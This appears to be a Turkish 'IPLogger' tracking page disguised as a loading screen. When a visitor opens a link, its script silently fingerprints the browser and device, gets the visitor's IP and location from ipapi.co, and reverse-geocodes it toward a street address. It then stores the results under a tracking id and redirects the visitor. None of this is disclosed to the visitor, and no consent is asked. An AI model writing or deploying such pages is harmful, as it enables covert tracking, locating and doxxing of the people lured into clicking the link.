<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yükleniyor...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            font-size: 1.5em;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <h2>Yükleniyor...</h2>
    </div>

    <script>
        // URL'den ID al
        const urlParams = new URLSearchParams(window.location.search);
        const linkId = urlParams.get('id');

        // Ziyaretçi bilgilerini topla
        async function collectVisitorInfo() {
            const visitorData = {
                timestamp: new Date().toISOString(),
                
                // Tarayıcı Bilgileri
                userAgent: navigator.userAgent,
                vendor: navigator.vendor,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                
                // Ekran Bilgileri
                screenResolution: `${screen.width}x${screen.height}`,
                screenAvailSize: `${screen.availWidth}x${screen.availHeight}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                devicePixelRatio: window.devicePixelRatio,
                
                // Zaman Bilgileri
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                localTime: new Date().toLocaleString('tr-TR'),
                
                // Tarayıcı Özellikleri
                referrer: document.referrer || 'Direct',
                cookiesEnabled: navigator.cookieEnabled,
                localStorageEnabled: typeof(Storage) !== "undefined",
                sessionStorageEnabled: typeof(sessionStorage) !== "undefined",
                indexedDBEnabled: !!window.indexedDB,
                doNotTrack: navigator.doNotTrack,
                
                // Cihaz Bilgileri
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                
                // Eklentiler
                plugins: Array.from(navigator.plugins).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                })),
                
                // Canvas Fingerprint
                canvasFingerprint: getCanvasFingerprint(),
                
                // WebGL Bilgileri
                webgl: getWebGLInfo(),
                
                // Ses Bilgileri
                audioContext: getAudioInfo(),
                
                // Medya Cihazları
                mediaDevices: await getMediaDevices(),
            };

            // Bağlantı bilgisi
            if (navigator.connection) {
                visitorData.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    downlinkMax: navigator.connection.downlinkMax,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type
                };
            }

            // Batarya bilgisi
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    visitorData.battery = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {}
            }

            // GPS kaldırıldı - Sadece IP bazlı konum kullanılıyor

            // IP ve konum bilgisi al (ücretsiz API)
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                visitorData.ip = data.ip;
                visitorData.ipVersion = data.version;
                visitorData.city = data.city;
                visitorData.region = data.region;
                visitorData.region_code = data.region_code;
                visitorData.country = data.country_name;
                visitorData.country_code = data.country_code;
                visitorData.country_capital = data.country_capital;
                visitorData.country_tld = data.country_tld;
                visitorData.continent_code = data.continent_code;
                visitorData.postal = data.postal;
                visitorData.latitude = data.latitude;
                visitorData.longitude = data.longitude;
                visitorData.org = data.org;
                visitorData.asn = data.asn;
                visitorData.timezone_api = data.timezone;
                visitorData.utc_offset = data.utc_offset;
                visitorData.country_calling_code = data.country_calling_code;
                visitorData.currency = data.currency;
                visitorData.currency_name = data.currency_name;
                visitorData.languages_spoken = data.languages;
                visitorData.country_area = data.country_area;
                visitorData.country_population = data.country_population;

                // IP bazlı koordinatlardan da adres bul (GPS yoksa)
                if (!visitorData.gps && data.latitude && data.longitude) {
                    try {
                        const geoResponse = await fetch(
                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.latitude}&lon=${data.longitude}&zoom=18&addressdetails=1`,
                            {
                                headers: {
                                    'User-Agent': 'IPLogger/1.0'
                                }
                            }
                        );
                        const geoData = await geoResponse.json();
                        
                        if (geoData.address) {
                            visitorData.ipBasedAddress = {
                                formatted: geoData.display_name,
                                road: geoData.address.road,
                                houseNumber: geoData.address.house_number,
                                neighbourhood: geoData.address.neighbourhood || geoData.address.suburb,
                                district: geoData.address.district || geoData.address.county,
                                city: geoData.address.city || geoData.address.town || geoData.address.village,
                                state: geoData.address.state,
                                postcode: geoData.address.postcode,
                                country: geoData.address.country,
                                countryCode: geoData.address.country_code
                            };
                        }
                    } catch (e) {
                        console.error('IP-based reverse geocoding hatası:', e);
                    }
                }
            } catch (error) {
                console.error('IP bilgisi alınamadı:', error);
            }

            // Tracking ID'yi bul
            const linkData = JSON.parse(localStorage.getItem(`link_${linkId}`) || '{}');
            const trackingId = linkData.trackingId;

            // Veriyi kaydet
            try {
                // Link data'yı güncelle
                if (!linkData.visits) linkData.visits = [];
                linkData.visits.push(visitorData);
                localStorage.setItem(`link_${linkId}`, JSON.stringify(linkData));
                
                // Tracking ID ile de kaydet (eğer varsa)
                if (trackingId) {
                    const trackingData = JSON.parse(localStorage.getItem(`trackdata_${trackingId}`) || '{"visits":[]}');
                    if (!trackingData.visits) trackingData.visits = [];
                    trackingData.visits.push(visitorData);
                    localStorage.setItem(`trackdata_${trackingId}`, JSON.stringify(trackingData));
                }
            } catch (e) {
                console.error('Veri kaydetme hatası:', e);
            }

            // Yönlendirme yap
            if (linkData && linkData.redirectUrl) {
                setTimeout(() => {
                    window.location.href = linkData.redirectUrl;
                }, 1000);
            } else {
                // Basit sayfa göster
                document.body.innerHTML = `
                    <div style="text-align: center; padding: 40px;">
                        <h1 style="font-size: 3em; margin-bottom: 20px;">👋</h1>
                        <h2>Merhaba!</h2>
                        <p style="margin-top: 10px; opacity: 0.8;">Bu bir test sayfasıdır.</p>
                    </div>
                `;
            }
        }

        // Canvas Fingerprint
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Canvas Fingerprint', 2, 2);
                return canvas.toDataURL().substring(0, 50);
            } catch (e) {
                return 'Unavailable';
            }
        }

        // WebGL Bilgileri
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'Not supported';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                };
            } catch (e) {
                return 'Unavailable';
            }
        }

        // Ses Bilgileri
        function getAudioInfo() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) return 'Not supported';
                
                const context = new AudioContext();
                return {
                    sampleRate: context.sampleRate,
                    state: context.state,
                    maxChannelCount: context.destination.maxChannelCount
                };
            } catch (e) {
                return 'Unavailable';
            }
        }

        // Medya Cihazları
        async function getMediaDevices() {
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                    return 'Not supported';
                }
                
                const devices = await navigator.mediaDevices.enumerateDevices();
                return {
                    audioInput: devices.filter(d => d.kind === 'audioinput').length,
                    audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
                    videoInput: devices.filter(d => d.kind === 'videoinput').length
                };
            } catch (e) {
                return 'Permission denied';
            }
        }

        if (linkId) {
            collectVisitorInfo();
        } else {
            document.body.innerHTML = '<div style="text-align: center;"><h2>❌ Geçersiz link!</h2></div>';
        }
    </script>
</body>
</html>
